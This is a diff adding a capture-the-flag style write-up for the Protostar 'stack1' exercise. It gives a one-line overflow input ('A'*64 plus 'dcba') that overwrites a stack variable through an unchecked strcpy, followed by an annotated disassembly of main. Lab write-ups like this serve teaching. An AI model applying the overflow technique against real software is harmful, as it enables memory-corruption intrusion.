@@ -1,0 +1,79 @@
+
+
+Solution: 
+
+	 ./stack1 `python3 -c "print('A'*64+'dcba')"`
+	
+	The strategy here is very similar to the solution of stack0. However instead of an arbitrary value pushed into modified we want to get the hex value '0x61626364' into modified. The biggest thing here is the endianness of the system, x86 is little endian, so we want to actually end our overflow string with '0x64636261' or 'dcba'. 
+
+Analysis: 
+	
+	6(main) : Allocates 0x60 bytes on the stack
+	9(main) : Retrieves argc from the 'previous' stack and cmps to 1
+       13(main) : If not equal goes into  an error subroutine otherwise
+		  continue with the program
+       15(main) : Pushes a 4-byte string ref onto the second to top pos of
+		  the stack
+       23(main) : Pushes the val 0x1 onto the top of the stack
+       30(main) : Calls the error subroutine
+       35(main) : Inits modified with 0 at the bottom of the stack
+       43(main) : Retrieves the address of argv into eax
+       46(main) : Calculates address of argv[1]
+       49(main) : Moves argv[1] into eax 
+       51(main) : Places that object in second to top val of stack
+       55(main) : Moves address of top of buffer in stack to eax
+       59(main) : Moves that address to top of stack for strcpy
+       62(main) : Calls strcpy
+       67(main) : Moves modified into eax
+       71(main) : Compares eax with 0x61626364
+       76(main) : If not equal go fail routine at 92
+       78(main) : Puts string ref to top of stack
+       85(main) : Call puts to print above string to stdout
+       90(main) : jmp to end program routine
+       92(main) : Moves modified into edx
+       96(main) : Moves string ref into eax
+      101(main) : Place modified in second to first position of stack
+      105(main) : Place string ref into top of stack
+      108(main) : Printf routine
+      113(main) : set ESP to EBP and pop back old EBP
+
+
+(gdb) disas main
+Dump of assembler code for function main:
+   0x08048464 <+0>:     push   ebp
+   0x08048465 <+1>:     mov    ebp,esp
+   0x08048467 <+3>:     and    esp,0xfffffff0
+   0x0804846a <+6>:     sub    esp,0x60
+   0x0804846d <+9>:     cmp    DWORD PTR [ebp+0x8],0x1
+   0x08048471 <+13>:    jne    0x8048487 <main+35>
+   0x08048473 <+15>:    mov    DWORD PTR [esp+0x4],0x80485a0
+   0x0804847b <+23>:    mov    DWORD PTR [esp],0x1
+   0x08048482 <+30>:    call   0x8048388 <errx@plt>
+   0x08048487 <+35>:    mov    DWORD PTR [esp+0x5c],0x0
+   0x0804848f <+43>:    mov    eax,DWORD PTR [ebp+0xc]
+   0x08048492 <+46>:    add    eax,0x4
+   0x08048495 <+49>:    mov    eax,DWORD PTR [eax]
+   0x08048497 <+51>:    mov    DWORD PTR [esp+0x4],eax
+   0x0804849b <+55>:    lea    eax,[esp+0x1c]
+   0x0804849f <+59>:    mov    DWORD PTR [esp],eax
+   0x080484a2 <+62>:    call   0x8048368 <strcpy@plt>
+   0x080484a7 <+67>:    mov    eax,DWORD PTR [esp+0x5c]
+   0x080484ab <+71>:    cmp    eax,0x61626364
+   0x080484b0 <+76>:    jne    0x80484c0 <main+92>
+   0x080484b2 <+78>:    mov    DWORD PTR [esp],0x80485bc
+   0x080484b9 <+85>:    call   0x8048398 <puts@plt>
+   0x080484be <+90>:    jmp    0x80484d5 <main+113>
+   0x080484c0 <+92>:    mov    edx,DWORD PTR [esp+0x5c]
+   0x080484c4 <+96>:    mov    eax,0x80485f3
+   0x080484c9 <+101>:   mov    DWORD PTR [esp+0x4],edx
+   0x080484cd <+105>:   mov    DWORD PTR [esp],eax
+   0x080484d0 <+108>:   call   0x8048378 <printf@plt>
+   0x080484d5 <+113>:   leave  
+   0x080484d6 <+114>:   ret    
+End of assembler dump.
+
+
+       
+
+    
+	
